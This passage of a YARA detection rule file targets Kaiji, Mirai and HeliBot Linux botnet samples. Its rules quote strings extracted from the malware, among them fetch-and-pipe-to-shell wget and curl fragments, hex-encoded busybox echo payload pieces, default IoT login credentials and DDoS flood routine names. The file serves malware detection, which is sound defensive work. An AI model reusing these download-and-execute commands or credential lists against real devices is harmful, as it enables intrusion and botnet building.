      $x1 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii /* score: '51.00'*/
      $x2 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii /* score: '47.00'*/
      $x3 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<ni" ascii /* score: '31.50'*/
      $x4 = ":[_outboundatomicor8attempts:bad indirbad prunebus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,files" ascii /* score: '31.00'*/
      $s5 = "value=abortedaccept4androidanswerschtimeschunkedconnectcpuprofderivedexpiresfloat32float64forcegcfstatatgctracehead = invalidips" ascii /* score: '28.00'*/
      $s6 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s(nil), fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<ni" ascii /* score: '19.50'*/
      $s7 = "UUUUUUUUV" fullword ascii /* reversed goodware string 'VUUUUUUUU' */ /* score: '16.50'*/
      $s8 = "1895751953125LockOSThread nesting overflowNon-Authoritative InformationProxy Authentication RequiredSIGPIPE: write to broken pip" ascii /* score: '15.00'*/
      $s9 = "agebincgodirdnsendfinftpgc gp in intkeymapmsanilobjpc=ptrsetsshtcpudpvia{0}{A}{a}" fullword ascii /* score: '15.00'*/
      $s10 = "ection losthttp: idle connection timeoutinteger not minimally-encodedinternal error: took too muchinvalid function symbol tablei" ascii /* score: '15.00'*/
      $s11 = "eSIGPWR: power failure restartTime.UnmarshalBinary: no dataUnavailable For Legal Reasonsaccess-control-expose-headersaccess-cont" ascii /* score: '15.00'*/
      $s12 = "-521RangeRealmRunicSHA-1SHELLSTermTakriTamilTypeA] = (arraybad nchdirchmodclosecronddeferdeny" fullword ascii /* score: '14.00'*/
      $s13 = "unsupported compression for x509: invalid DSA parametersx509: invalid DSA public keyx509: invalid RSA public key4547473508864641" ascii /* score: '13.00'*/
      $s14 = "  minutes nalloc= newval= nfreed= packed= ping=%q pointer stack=[ status %!Month() errno=/gid_map/uid_map/var/run2.5.4.102.5.4.1" ascii /* score: '12.00'*/
      $s15 = "nvalid length of trace eventio: read/write on closed pipemachine is not on the networkmismatched local address typeno XENIX sema" ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__a82036bb_Kaiji_signature__bd7a37a8_Kaiji_signature__c6c0da6a_Kaiji_signature__ded5e440_Ka_44 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash3 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash4 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash5 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash6 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii /* score: '53.00'*/
      $x2 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii /* score: '51.00'*/
      $x3 = "d hostname: multihop attemptedno child processesno locks availablenon-minimal lengthoperation canceledpermessage-deflateproxy-au" ascii /* score: '31.00'*/
      $s4 = "havingstopping the worldstreams pipe errorsync.RWMutex.RLocksystem page size (tracebackancestorstruncated sequenceunexpected mes" ascii /* score: '23.00'*/
      $s5 = "entersyscallexit status gcBitsArenasgcpacertraceharddecommithost is downifconfig.cfgillegal seekinvalid atypinvalid baseinvalid " ascii /* score: '21.00'*/
      $s6 = "files,dnsfork/execfuncargs(function hchanLeafinittraceinterfaceinterruptinvalid nipv6-icmplocalhostlocaltimemSpanDeadnewosprocni" ascii /* score: '16.00'*/
      $s7 = "runtime.headTailIndex.tail" fullword ascii /* score: '15.00'*/
      $s8 = "adaptivestackstartbad Content-Lengthbad manualFreeListbad point length: bufio: buffer fullcleantimers: bad pconnection refusedco" ascii /* score: '14.00'*/
      $s9 = ":[_outboundatomicor8attempts:bad indirbus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,filesempty url" ascii /* score: '14.00'*/
      $s10 = "of rangerandautoseedreaddirnamesrecv_goaway_reflect.Copyreleasep: m=remote errorruntime: gp=runtime: sp=s ap traffics hs traffic" ascii /* score: '13.00'*/
      $s11 = "not remap pages in address spacespan on userArena.faultList has invalid sizetls: server sent an incorrect legacy versiontls: ser" ascii /* score: '13.00'*/
      $s12 = "sageunknown time zone use of closed filevalue out of range (%d bytes omitted) (abnormal closure) (policy violation) (unsupported" ascii /* score: '13.00'*/
      $s13 = "ntext.Backgrounddecoding error: %vexport restrictionfile name too longforEachP: not doneframe_goaway_shortgarbage collectionhttp" ascii /* score: '13.00'*/
      $s14 = "tion timeoutinteger not minimally-encodedinternal error: took too muchinvalid function symbol tableinvalid length of trace event" ascii /* score: '12.00'*/
      $s15 = "sult out of rangeoperation already in progresspadding contained in alphabetpkcs12: odd-length BMP stringpoly1305: unexpected ove" ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__a82036bb_Kaiji_signature__bd7a37a8_45 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_a82036bb.elf, Kaiji(signature)_bd7a37a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash2 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii /* score: '69.50'*/
      $x2 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii /* score: '47.00'*/
      $x3 = ":[_outboundatomicor8attempts:bad indirbus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,filesempty url" ascii /* score: '31.00'*/
      $s4 = "asn1: syntax error: assigned stream ID 0bad font file formatbad system page sizebad use of bucket.bpbad use of bucket.mpbrotli: " ascii /* score: '28.00'*/
      $s5 = "extStart=  previous allocCount=, levelBits[level] = /etc/opt.services.cfg/proc/self/setgroups" fullword ascii /* score: '18.00'*/
      $s6 = "yExchangetoo many Answers to pack (>65535)too many levels of symbolic linksunaligned 64-bit atomic operationunsupported transfer" ascii /* score: '17.00'*/
      $s7 = "me_too_largereflect.Value.SetIntreflect.makeFuncStubruntime: double waitruntime: pipe failedselectgo: bad wakeupsemaRoot rotateR" ascii /* score: '16.00'*/
      $s8 = "m=] = ] n=allgallpasn1basebindbitsboolcallcas1cas2cas3cas4cas5cas6chancrondatedeaddialerroetagexitfilefindfromftpsfuncgziphostho" ascii /* score: '16.00'*/
      $s9 = "p: already in goworkbuf is not emptywrite of Go pointer x509: malformed spkix509usefallbackroots of unexported method pcHeader.t" ascii /* score: '15.00'*/
      $s10 = "Lockthread exhaustiontransfer-encodingtruncated headersunknown caller pcunknown error 141unknown error 142unknown type kindunrec" ascii /* score: '14.00'*/
      $s11 = "m=] = ] n=allgallpasn1basebindbitsboolcallcas1cas2cas3cas4cas5cas6chancrondatedeaddialerroetagexitfilefindfromftpsfuncgziphostho" ascii /* score: '13.00'*/
      $s12 = "(MISSING)(unknown), newval=, oldval=, size = , tail = -07:00:00/dev/null/dns-tcp4/etc/rc.d/usr/bin/244140625: status=AuthorityBa" ascii /* score: '13.00'*/
      $s13 = "mdnsnoneopenpop3quitreadroots + sbrksha" fullword ascii /* score: '11.00'*/
      $s14 = "#+,/1;=LMOSZ[hms{} + / @ P [ " fullword ascii /* score: '8.00'*/
      $s15 = ", ->-c-o.///000X0b0o0s0x13255380: ; =#> ?0?1??A3A4AMCNCcCfCoCsLlLmLoLtLuMcMeMnNdNlNoOKOUPMPcPdPePfPiPoPsSTScSkSmSoTZTeToV1V2V3V5" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0041a549_Mirai_signature__007e5dc7_Mirai_signature__0120def2_Mirai_signature__049f1bd6_Mirai_signature__06_46 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0041a549.elf, Mirai(signature)_007e5dc7.elf, Mirai(signature)_0120def2.elf, Mirai(signature)_049f1bd6.elf, Mirai(signature)_062aa4ec.elf, Mirai(signature)_07fa795b.elf, Mirai(signature)_082473db.elf, Mirai(signature)_08816e63.elf, Mirai(signature)_0b625b19.elf, Mirai(signature)_0cb12f03.elf, Mirai(signature)_0cc43412.elf, Mirai(signature)_0ccf3e87.elf, Mirai(signature)_0d9c7ca0.elf, Mirai(signature)_0e5b6487.elf, Mirai(signature)_0fd1878b.elf, Mirai(signature)_100e0eb8.elf, Mirai(signature)_103a878e.elf, Mirai(signature)_10de6f3d.elf, Mirai(signature)_119a75f8.elf, Mirai(signature)_1226d3ad.elf, Mirai(signature)_12b03eff.elf, Mirai(signature)_1349ebd3.elf, Mirai(signature)_142ac936.elf, Mirai(signature)_16877e8c.elf, Mirai(signature)_16b7eb2d.elf, Mirai(signature)_18112ef9.elf, Mirai(signature)_198c0ce2.elf, Mirai(signature)_19adf628.elf, Mirai(signature)_1b318c60.elf, Mirai(signature)_1b42c968.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0041a54918dc80ac097d1063dad4b279603369cab83b65d719863df1a677dad6"
      hash2 = "007e5dc71d719cca62c058bb806143c2d7627f80d204c25494229d012d535cb4"
      hash3 = "0120def2fd98cdeceaf7a995d2df01e656d8dc4ff9927cfd5aa58aefb5e16495"
      hash4 = "049f1bd6cabe4f7f2355d75547cb96fd7a2951b71899049932812ca2f81d0f69"
      hash5 = "062aa4ecf94b7ab380b39e32677c80859ca4331cf00b85a8c7ab3a728da9a3cb"
      hash6 = "07fa795b94793c19b4b6e839e007894daa5809e1385353339ce92568c4183251"
      hash7 = "082473db8c5bd142e94d60312cb13ae9d01d1745f2924dc109e480e235203896"
      hash8 = "08816e635573569b4cb82c5002aaed63295a98a94f7dff72485be20db1762c44"
      hash9 = "0b625b19f44fcf0d5d279b91e1a31797e05822bcecebf5eb89f34fd54e7b943a"
      hash10 = "0cb12f03cf5aefd3d2dcfa90b1a9422f120424f2b1478b1d86ac04b90854f2f3"
      hash11 = "0cc43412e8c15933cf9bc8a449b22b0728272206ccd05a05007b0269827a8d3f"
      hash12 = "0ccf3e8740d68bc02719397bf7ce51a045219a4c24e87e19022d98116c820f2a"
      hash13 = "0d9c7ca00562af066cec1a68ef730c82b939e5893d2df0847fa13f68e58e865b"
      hash14 = "0e5b648736c6444322ab5e60c726a96f95a15c148f4243329b5a397eef0da948"
      hash15 = "0fd1878b69312fbf748d3be8ba65b3431083985fcfe65a3b32a74a8ef69cdf89"
      hash16 = "100e0eb8f8e79c69ad97e36e542700bb8e1b83986de9b0a65e8e80c92a8cee7f"
      hash17 = "103a878e20f9a3924abb9e1fc4ebada0a6eb8adc74ca59035ff1e14805d20ae1"
      hash18 = "10de6f3d9a873d1085221d0503ca9fd3c1cb6127a6dd81063249a9f0e4b40ff9"
      hash19 = "119a75f8023545d7c344b7f195a18f7a3158fedb585562bd3a5dbe1452ceafea"
      hash20 = "1226d3ada8094df0a37f50cf5e366065570906e97b1a863cdecea5d67c673f14"
      hash21 = "12b03eff69a8c00a59dcee7c5da0c235ea62ef491581d67a6b8268dace350793"
      hash22 = "1349ebd3abb6414201588c32d768af7aba59dedf21fc817b872364406f8567e9"
      hash23 = "142ac936b9784e7b4ab66894312833684f55de981ef08e367130e20dc2257b43"
      hash24 = "16877e8cab68f6d6a557b0bee1e41a6d938997cb31a62cfe017ed21867b41801"
      hash25 = "16b7eb2d1f077ce1198a67b98bcb7caccd9511dd10bc39ea285aa2fba89be5d2"
      hash26 = "18112ef9bada413a225ebd359100f0937eda13f3bc61e7232d54b2335c5744de"
      hash27 = "198c0ce29b9d71a04dbf44baa87e916cf5ba47924f03961659472b84d9cd946a"
      hash28 = "19adf6285b1504c96400173287c0b0bdb8d0e071c3dff9706a67ea36a6e543a4"
      hash29 = "1b318c60fb6c646c4faf4860a9c7138ef69ab530f1a76e3e0f894ec3a6423e85"
      hash30 = "1b42c96817bc2176345953b1049ed126e3f82e01e52afba63562c72132bab2e4"
   strings:
      $s1 = "tluafed" fullword ascii /* reversed goodware string 'default' */ /* score: '18.00'*/
      $s2 = "User-Agent: Wget" fullword ascii /* score: '17.00'*/
      $s3 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s4 = "telecomadmin" fullword ascii /* score: '11.00'*/
      $s5 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s6 = "solokey" fullword ascii /* score: '11.00'*/
      $s7 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s8 = "/bin/busybox echo -ne " fullword ascii /* score: '11.00'*/
      $s9 = "dreambox" fullword ascii /* score: '8.00'*/
      $s10 = "unisheen" fullword ascii /* score: '8.00'*/
      $s11 = "wabjtam" fullword ascii /* score: '8.00'*/
      $s12 = "hikvision" fullword ascii /* score: '8.00'*/
      $s13 = "telnetadmin" fullword ascii /* score: '8.00'*/
      $s14 = "root123" fullword ascii /* score: '8.00'*/
      $s15 = "grouter" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__01b80109_Mirai_signature__0ec8732f_47 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_01b80109.elf, Mirai(signature)_0ec8732f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01b801099ef5f07ed95f7b8d9a88adbeefd3e28eef4b52f5d0a63f802ac4f04c"
      hash2 = "0ec8732f5976924bb57a2db8c51bc97a1ec6fd0386267e7efeb88f62c5e19ed0"
   strings:
      $s1 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s3 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s4 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s11 = "postgresql" fullword ascii /* score: '13.00'*/
      $s12 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15" fullword ascii /* score: '12.00'*/
      $s13 = "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1" fullword ascii /* score: '12.00'*/
      $s14 = "mapproxy" fullword ascii /* score: '11.00'*/
      $s15 = "rpcbind" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__03266de9_Mirai_signature__11acb17b_Mirai_signature__1c9641cc_48 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_03266de9.elf, Mirai(signature)_11acb17b.elf, Mirai(signature)_1c9641cc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "03266de95911a23c6f133c8b3458c7bb60c077cd24af26bd44e4b0ab2e70cc50"
      hash2 = "11acb17b81a126b2891ab86ed83c86d79a6dd6e147414549de5c7d51d7fa123a"
      hash3 = "1c9641cc234ca4af35563afeda4e0cdbfd85ecd280622d9f78cad89e647c9462"
   strings:
      $s1 = "[udpbypass_flood] socket() failed" fullword ascii /* score: '23.00'*/
      $s2 = "[udpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s3 = "[tcpbypass_flood] started: ('%d')" fullword ascii /* score: '23.00'*/
      $s4 = "[psh_ack_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s5 = "[ack_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s6 = "[icmp_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s7 = "[udp_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s8 = "[ack_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s9 = "[syn_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s10 = "[udp_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s11 = "[udp_plain_flood] started: ('%d')" fullword ascii /* score: '12.00'*/
      $s12 = "[icmp_flood] socket() failed" fullword ascii /* score: '12.00'*/
      $s13 = "[ack_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s14 = "[psh_ack_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
      $s15 = "[syn_flood] setsockopt() failed" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0b7b7321_Mirai_signature__1368463f_Mirai_signature__1781c186_49 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0b7b7321.elf, Mirai(signature)_1368463f.elf, Mirai(signature)_1781c186.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0b7b732129985b5071190ca43f24c3a9609aded4cc76f9c4950374e650184174"
      hash2 = "1368463ff5e905ed9ce63ed978d1ff6a03ff1ac373ac1ddca21dec9f8b3330ac"
      hash3 = "1781c1863810ca199f767491dcb715de7cb52c370bbce958641144b03e767d95"
   strings:
      $s1 = "Origin: https://www.youtube.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.netflix.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.yahoo.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.reddit.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.bing.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.youtube.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.yahoo.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.bing.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.netflix.com/" fullword ascii /* score: '17.00'*/
      $s10 = "Referer: https://www.google.com/" fullword ascii /* score: '17.00'*/
      $s11 = "Referer: https://www.reddit.com/" fullword ascii /* score: '17.00'*/
      $s12 = "X-Forwarded-For: 172.16.0.1" fullword ascii /* score: '14.00'*/
      $s13 = "X-Forwarded-For: 192.168.1.1" fullword ascii /* score: '14.00'*/
      $s14 = "X-Forwarded-For: 203.0.113.1" fullword ascii /* score: '14.00'*/
      $s15 = "X-Forwarded-For: 127.0.0.1" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _HeliBot_signature__Mirai_signature__11bcd56a_50 {
   meta:
      description = "_subset_batch - from files HeliBot(signature).elf, Mirai(signature)_11bcd56a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb21b1f4574a375639617cc47af121229e375c251bcc70b0358afaa1d1c66e49"
      hash2 = "11bcd56afbf36da794f6dea6e502005528c17659a4a36cbaf32c526ce1ed5234"
   strings:
      $s1 = "__stdio_mutex_initializer.4636" fullword ascii /* score: '15.00'*/
      $s2 = "gethostbyname2.c" fullword ascii /* score: '14.00'*/
      $s3 = "gethostbyname2_r.c" fullword ascii /* score: '14.00'*/
      $s4 = "gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s5 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s6 = "__GI_gethostname" fullword ascii /* score: '14.00'*/
      $s7 = "__GI_gethostbyname2" fullword ascii /* score: '14.00'*/
      $s8 = "__GI_gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s9 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s10 = "/home/landley/work/ab7/build/temp-armv6l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s11 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii /* score: '11.00'*/
      $s12 = "__resolv_attempts" fullword ascii /* score: '11.00'*/
      $s13 = "/home/landley/work/ab7/build/temp-armv6l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s14 = "hoste.5443" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _HeliBot_signature__Mirai_signature__00c1ea4d_Mirai_signature__01cb158d_Mirai_signature__0436ef41_Mirai_signature__06b6f527__51 {
   meta:
      description = "_subset_batch - from files HeliBot(signature).elf, Mirai(signature)_00c1ea4d.elf, Mirai(signature)_01cb158d.elf, Mirai(signature)_0436ef41.elf, Mirai(signature)_06b6f527.elf, Mirai(signature)_0d57aae1.elf, Mirai(signature)_11bcd56a.elf, Mirai(signature)_1266921b.elf, Mirai(signature)_13af32d8.elf, Mirai(signature)_180d9d0e.elf, Mirai(signature)_19e62b77.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb21b1f4574a375639617cc47af121229e375c251bcc70b0358afaa1d1c66e49"
      hash2 = "00c1ea4dcc447da03be41da9c55839f043a7298b99e4e91ff0d801aa445e3e0f"
      hash3 = "01cb158d1db0d9b5edb240be81c64632df83e7b41f4b899798deb5f405f3cb3d"
      hash4 = "0436ef4186a89f5d0f6ac3dcf057fee1f8c43c5dcd1b87ff68f66a5d72856136"
      hash5 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash6 = "0d57aae1d5eb48a3684729255b3d8b3b9c7386204ff121c457e1b2d539b9bb3d"
      hash7 = "11bcd56afbf36da794f6dea6e502005528c17659a4a36cbaf32c526ce1ed5234"
      hash8 = "1266921bdf3adb8d7d4fcd77abcd66bcd269e8d6594f2b45a9280c68d29ba6c1"
      hash9 = "13af32d855bbac2af57d71348bcd28d43e64a3609b931f54bbb88d9284ddbd52"
      hash10 = "180d9d0e774ec7b777d80113096ab47ef630308c626bf99f1c03cf80e1ccef24"
      hash11 = "19e62b77d21ddb588294e3254c61aa1f3475475903b0165b3dad4ac0e2886ca5"
   strings:
      $s1 = "__stdio_init_mutex" fullword ascii /* score: '15.00'*/
      $s2 = "__GI_gethostbyname" fullword ascii /* score: '14.00'*/
      $s3 = "get_hosts_byname_r.c" fullword ascii /* score: '14.00'*/
      $s4 = "gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s5 = "gethostbyname.c" fullword ascii /* score: '14.00'*/
      $s6 = "__GI_gethostbyname_r" fullword ascii /* score: '14.00'*/
      $s7 = "gethostbyname_r.c" fullword ascii /* score: '14.00'*/
      $s8 = "__get_hosts_byname_r" fullword ascii /* score: '14.00'*/
      $s9 = "__read_etc_hosts_r" fullword ascii /* score: '12.00'*/
      $s10 = "read_etc_hosts_r.c" fullword ascii /* score: '12.00'*/
      $s11 = "__decode_header" fullword ascii /* score: '11.00'*/
      $s12 = "decoded.c" fullword ascii /* score: '11.00'*/
      $s13 = "__encode_header" fullword ascii /* score: '9.00'*/
      $s14 = "encoded.c" fullword ascii /* score: '9.00'*/
      $s15 = "__open_etc_hosts" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0041a549_Mirai_signature__0120def2_Mirai_signature__049f1bd6_Mirai_signature__0fd1878b_Mirai_signature__10_52 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0041a549.elf, Mirai(signature)_0120def2.elf, Mirai(signature)_049f1bd6.elf, Mirai(signature)_0fd1878b.elf, Mirai(signature)_10de6f3d.elf, Mirai(signature)_12b03eff.elf, Mirai(signature)_16877e8c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0041a54918dc80ac097d1063dad4b279603369cab83b65d719863df1a677dad6"
      hash2 = "0120def2fd98cdeceaf7a995d2df01e656d8dc4ff9927cfd5aa58aefb5e16495"
      hash3 = "049f1bd6cabe4f7f2355d75547cb96fd7a2951b71899049932812ca2f81d0f69"
      hash4 = "0fd1878b69312fbf748d3be8ba65b3431083985fcfe65a3b32a74a8ef69cdf89"
      hash5 = "10de6f3d9a873d1085221d0503ca9fd3c1cb6127a6dd81063249a9f0e4b40ff9"
      hash6 = "12b03eff69a8c00a59dcee7c5da0c235ea62ef491581d67a6b8268dace350793"
      hash7 = "16877e8cab68f6d6a557b0bee1e41a6d938997cb31a62cfe017ed21867b41801"
   strings:
      $s1 = "/t/wget.sh -O- | sh;curl http://" fullword ascii /* score: '20.00'*/
      $s2 = "/bin/busybox wget http://" fullword ascii /* score: '15.00'*/
      $s3 = "/t/curl.sh -o- | sh" fullword ascii /* score: '12.00'*/
      $s4 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
      $s5 = "/bin/busybox echo -ne \"\\x69\\x6E\\x75\\x65\\x0A\\x20\\x20\\x66\\x69\\x0A\\x0A\\x20\\x20\\x23\\x20\\x47\\x65\\x74\\x20\\x74\\x6" ascii /* score: '11.00'*/
      $s6 = "/bin/busybox echo -ne \"\\x71\\x20\\x22\\x24\\x70\\x69\\x64\\x22\\x20\\x5D\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x7" ascii /* score: '11.00'*/
      $s7 = "/bin/busybox echo -ne \"\\x20\\x43\\x68\\x65\\x63\\x6B\\x20\\x69\\x66\\x20\\x74\\x68\\x65\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x6" ascii /* score: '11.00'*/
      $s8 = "/bin/busybox echo -ne \"\\x6E\\x75\\x6D\\x65\\x72\\x69\\x63\\x20\\x64\\x69\\x72\\x65\\x63\\x74\\x6F\\x72\\x69\\x65\\x73\\x0A\\x2" ascii /* score: '11.00'*/
      $s9 = "useradmin" fullword ascii /* score: '11.00'*/
      $s10 = "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x6" ascii /* score: '11.00'*/
      $s11 = "/bin/busybox echo -ne \"\\x20\\x43\\x68\\x65\\x63\\x6B\\x20\\x69\\x66\\x20\\x74\\x68\\x65\\x20\\x63\\x6F\\x6D\\x6D\\x61\\x6E\\x6" ascii /* score: '11.00'*/
      $s12 = "/bin/busybox echo -ne \"\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7" ascii /* score: '11.00'*/
      $s13 = "/bin/busybox echo -ne \"\\x76\\x72\\x48\\x65\\x6C\\x70\\x65\\x72\\x22\\x0A\\x20\\x20\\x69\\x66\\x20\\x65\\x63\\x68\\x6F\\x20\\x2" ascii /* score: '11.00'*/
